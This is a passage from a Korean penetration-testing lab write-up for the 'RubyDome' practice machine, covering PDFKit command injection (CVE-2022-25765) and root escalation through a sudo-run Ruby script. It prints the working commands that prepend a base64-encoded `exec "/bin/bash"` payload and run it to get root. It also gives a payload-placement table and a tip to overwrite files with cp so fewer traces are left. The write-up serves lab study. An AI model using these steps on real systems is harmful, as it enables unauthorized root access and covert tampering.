andrew@rubydome:~/app$ ls -la /home/andrew/app/app.rb
-rwxrwx--- 1 andrew andrew 1032 Apr 24  2023 /home/andrew/app/app.rb
```

`rwx`(소유자 andrew) / `rwx`(그룹 andrew) / `---`(기타). 내가 소유자이고 쓰기 권한이 있으므로 권한 경계는 이미 무너져 있음.

**앱 소스** `[가정]` — **`app.rb` 실물이 Kali 에 저장돼 있지 않아 아래는 재구성임.** 뼈대는 백트레이스로 고정됨 — `err.html` 의 ``app.rb:35:in `block in <main>'`` 가 `to_file` 호출 프레임이므로 34=`PDFKit.new` / 35=`to_file` 배치와 정합적임.

```ruby
require 'pdfkit'
require 'sinatra'

set :bind, '0.0.0.0'
set :port, 3000

get '/' do
end

post '/pdf' do
  url = params['url']
  kit = PDFKit.new(url)
  kit.to_file('page.pdf')
  send_file('page.pdf')
end
```

데이터 흐름은 네 홉이고 어느 홉에도 검증이 없음:

| 홉 | 무슨 일이 일어나는가 |
|---|---|
| HTTP body `url=…` | Rack 이 퍼센트 디코딩 |
| `params['url']` | String, 검증 0 |
| `PDFKit.new(url)` | `PDFKit::Source.new(url)` 로 전달 |
| `PDFKit#command` | wkhtmltopdf 명령을 **문자열**로 조립 |
| `IO.popen(문자열)` | `/bin/sh -c "<문자열>"` 실행 |

**페이로드 삽입과 실행**

```bash
andrew@rubydome:~/app$ cp /home/andrew/app/app.rb /tmp/app.rb.bak
andrew@rubydome:~/app$ echo ZXhlYyAiL2Jpbi9iYXNoIg== | base64 -d > /tmp/p.rb; echo >> /tmp/p.rb
andrew@rubydome:~/app$ cat /tmp/p.rb /home/andrew/app/app.rb > /tmp/n.rb
andrew@rubydome:~/app$ cp /tmp/n.rb /home/andrew/app/app.rb
andrew@rubydome:~/app$ head -3 /home/andrew/app/app.rb
exec "/bin/bash"
require 'pdfkit'
require 'sinatra'
```

- `ZXhlYyAiL2Jpbi9iYXNoIg==` 는 `exec "/bin/bash"` 의 base64(디코드 대조 확인). 따옴표가 든 문자열을 원시 셸에 그대로 치면 깨지기 쉬워 여기서도 base64 로 감쌈
- `echo >> /tmp/p.rb` — base64 원문에 개행이 없으므로 줄바꿈을 명시적으로 추가함. 없으면 `exec "/bin/bash"require 'pdfkit'` 이 되어 문법 오류
- `cat A B > C` 후 `cp C 원본` — prepend 의 정석 관용구. `sed -i '1i ...'` 로도 되나 인용이 또 겹침
- `cp` 로 덮어쓴 이유는 원본 파일의 inode·소유권을 유지하기 위함임

**페이로드는 반드시 맨 앞에 넣어야 함.** `require 'sinatra'` 가 classic 모드에서 `at_exit { ... run! ... }` 를 등록하므로, 스크립트 본문이 끝나면 인터프리터가 종료 훅을 돌리며 웹서버 루프에 들어가 영원히 반환하지 않음. **「스크립트 끝」이 실행 시점상 끝이 아님.** 맨 앞에 두면 `require` 이전에 프로세스가 bash 로 치환됨.

| 대상 스크립트의 성격 | 페이로드 위치 |
|---|---|
| 블로킹 서버(Sinatra·Flask·Express·`while true`) | 맨 앞(prepend) |
| 짧게 끝나는 배치·크론 스크립트 | 앞/뒤 아무데나 |
| 조건 분기 안에서만 도는 스크립트 | 반드시 분기 밖 최상단 |
| 파일 전체가 함수 정의뿐 | 최상단도 무의미 → `at_exit`/`END` 블록 이용 |

`exec` 를 쓰는 이유도 있음. `system("/bin/bash")` 는 자식 프로세스를 띄우고 돌아오지만 `exec` 는 현재 프로세스 이미지를 bash 로 치환함 — root uid 를 그대로 물려받고 `at_exit` 훅도 등록 전에 사라짐.

```bash
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# id
uid=0(root) gid=0(root) groups=0(root)
root@rubydome:/home/andrew/app# cat /root/proof.txt
9fdc8077f413eac85c2f5b624548a8c2
```

명령은 `sudo -l` 출력과 글자 단위로 일치시킬 것. `sudo ruby /home/andrew/app/app.rb`(절대경로 아님)나 `cd app; sudo ruby app.rb`(상대경로)는 거부될 수 있음 — sudoers 는 명령을 문자열과 경로로 매칭함.

**원복**

```bash
root@rubydome:/home/andrew/app# cp /tmp/app.rb.bak /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# chown andrew:andrew /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# head -2 /home/andrew/app/app.rb
require 'pdfkit'
require 'sinatra'
```

> [!danger] 위 `chown` 은 불필요했음 — `cp` 는 기존 파일의 소유자를 바꾸지 않음
> Kali 에서 재현:
> ```text
> -rw-rw-r-- 1 kali kali 4 f
> -rw-rw-r-- 1 kali kali 4 f        (sudo cp n f 후: 소유자·권한 그대로)
> -rw-r--r-- 1 root root 4 f2       (sudo mv n f2 후: 새 파일 → root 소유)
> ```
> — 출처: Kali `/tmp/cptest/`
>
> `cp` 는 기존 파일을 `O_TRUNC` 로 열어 내용만 갈아끼움 — inode·소유자·퍼미션이 전부 유지됨. 소유권이 바뀌는 것은 대상 파일이 없어 새로 만들어질 때이고, 그때는 만든 프로세스의 uid 가 붙음.
>
> | 방법 | 기존 파일이 있을 때 소유자 | `chown` 필요 |
> |---|---|---|
> | `cp new target` | 원본 유지 | 불필요 |
> | `cat new > target` | 원본 유지(셸이 `O_TRUNC` 로 열 뿐) | 불필요 |
> | `mv new target` | new 쪽 소유자로 교체(inode 가 바뀜) | 필요 |
> | 파일이 원래 없었을 때 | 만든 프로세스의 uid | 필요 |
>
> 실무 함의 — 쓰기 권한만 있고 소유권은 없는 파일을 노릴 때 `mv` 로 갈아치우면 소유자가 바뀌어 흔적이 남으므로 조용히 가려면 `cp` 나 리다이렉션을 쓸 것. 반대로 디렉터리 쓰기 권한만 있으면 `mv` 밖에 길이 없고 그때는 `chown` 이 실제로 필요함.

**다른 경로**

| 후보 | 판정 |
|---|---|
| `sudo -l` 규칙 악용 | 채택. 가장 짧고 재현 가능 |
| SUID 바이너리 | 확인 대상이었으나 sudo 경로가 먼저 성립해 불필요 — **배제한 것이 아니라 안 해본 것임** |
| `andrew` 가 `sudo` 그룹(27) 소속 | 비밀번호를 알면 `sudo su` 로 직행 가능하나 리버스셸이라 비밀번호가 없음 → NOPASSWD 규칙이 실질적 해답 |
| 크론 | 미확인 |
| 앱이 root 로 구동? | 아님. 셸이 `andrew` 로 떨어졌으므로 Sinatra 는 andrew 권한으로 돎([[Hawat]]·[[Hub]] 와 대조되는 지점) |

### Post-Exploitation

**Proof.txt value:**
`9fdc8077f413eac85c2f5b624548a8c2` (`/root/proof.txt`)

> [!note] 두 플래그 값은 **이전 침투 세션에서 확보한 것**이고 이 검증 세션에서 재확인하지 않음 `[가정]`
> 타겟이 정지돼 재조회 불가. 값 자체를 의심할 근거는 없으나 **살아 있는 셸에서 다시 뽑아보지 않았다**는 사실을 적어 둠.
> 증거 파일 **없음** — `~/PG/RubyDome/` 에 `proof_user.txt`·`proof_root.txt` 형식의 한 화면 출력이 저장되지 않았음(전수: `nmap.log`·`nmap.stdout`·`err.html`·`gobuster.txt`·`gobuster_common.txt`·`pdfkit-0.8.6.gem`·`gemsrc/`·`pop.py`·`test.py`·`rev.py`·`rev2.py`·`rd.sh`). 스크린샷도 0장.
> 시험에서는 `whoami; id; hostname; hostname -I; date; cat /root/proof.txt` 를 **한 명령으로 묶어** 그 출력 전체를 파일로 남길 것 — 프롬프트만으로는 증거로 인정되지 않음.

**남긴 흔적**

| 항목 | 상태 |
|---|---|
| `/home/andrew/app/app.rb` | 복구 완료 — 백업본으로 `cp` 덮어쓰기 후 `head -2` 로 확인 |
| `/tmp/app.rb.bak` · `/tmp/p.rb` · `/tmp/n.rb` | 남아 있음(삭제 기록 없음) — 랩 Stop/Revert 로 소멸 |
| `~/app/page.pdf` | 변환 결과물이 앱 작업 디렉터리에 갱신됨 |
| Kali `~/PG/RubyDome/rd.sh` · `gemsrc/pdfkit-0.8.6/` | 로컬 보관(재사용 자산) |
| Kali `/tmp/pk/` · `/tmp/cptest/` | 패치 대조·`cp` 소유권 검증용. 삭제하지 않음 |

획득 자격증명 없음 — foothold 와 권한상승 모두 비밀번호 없이 성립함(NOPASSWD 규칙).

## 관련

- CVE-2022-25765 — PDFKit(Ruby gem) OS Command Injection. 영향 범위 `< 0.8.7.2`, `0.8.7` 은 불완전 수정
  - Snyk: <https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795>
  - 0.8.6(취약): <https://github.com/pdfkit/pdfkit/blob/v0.8.6/lib/pdfkit/source.rb>
  - 0.8.7(판정만 고침, 쌍따옴표 잔존): <https://github.com/pdfkit/pdfkit/blob/v0.8.7/lib/pdfkit/source.rb>
  - 0.8.7.2(`escaped_url`, 쌍따옴표 제거): <https://github.com/pdfkit/pdfkit/blob/v0.8.7.2/lib/pdfkit/source.rb>
  - 세 버전을 나란히 놓고 봐야 어디가 고쳐졌는지 보임 — 두 개만 보면 수정을 엉뚱한 버전에 귀속시킴
- CWE-78 OS Command Injection: <https://cwe.mitre.org/data/definitions/78.html>
- GTFOBins `ruby`: <https://gtfobins.github.io/gtfobins/ruby/> — 인자 고정 sudo 규칙에서는 적용 불가
- [[Crane]] — 「응답이 성공을 뜻하지 않는다」 동일 패턴(타임아웃 = 성공)
- [[Levram]] — 개발 서버(`WSGIServer`) 배너로 방향을 잡은 동일 흐름
- [[Hub]] — 버전 판정 근거 2개 규율 / 서비스가 특권으로 구동되는 대조 사례
- [[Hawat]] — 인용 중첩을 hex 리터럴로 회피, 웹셸 실행 주체 확인
- [[Outdated]] — 같은 HTML→PDF 변환기 계열(mPDF `<annotation>` 임의 파일 읽기)
- [[Squid]] · [[Exfiltrated]] — 같은 계열의 인코딩 회피 기법
- [[01. Pentest Foundations]] — RubyDome 항목
- [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-16. 워드리스트 열거가 전부 공전한다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-43. `sudo -l` 이 좁아도 대상 파일 권한을 확인한다]] · [[_PLAYBOOK#A-63. 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다]]
- [[_PLAYBOOK#B-1-23. 문서 변환기(HTML→PDF)는 서버측 파서다 — mPDF `<annotation>` 임의 파일 읽기]] · [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]]
- [[_PLAYBOOK#A-2-30. 페이로드는 맞는데 200 이 온다 — 내 전송 계층이 이미 디코드했다]] · [[_PLAYBOOK#A-4-14. sudo 로 스크립트를 실행했는데 프롬프트가 안 돌아온다 — 페이로드 «위치»가 틀렸다]] · [[_PLAYBOOK#A-1-17. nmap 이 `filtered` 라고 적은 포트를 버렸다]]
- [[_PLAYBOOK#B-1-41. 개발 서버 배너를 보면 dirbust 대신 «일부러 500»]]
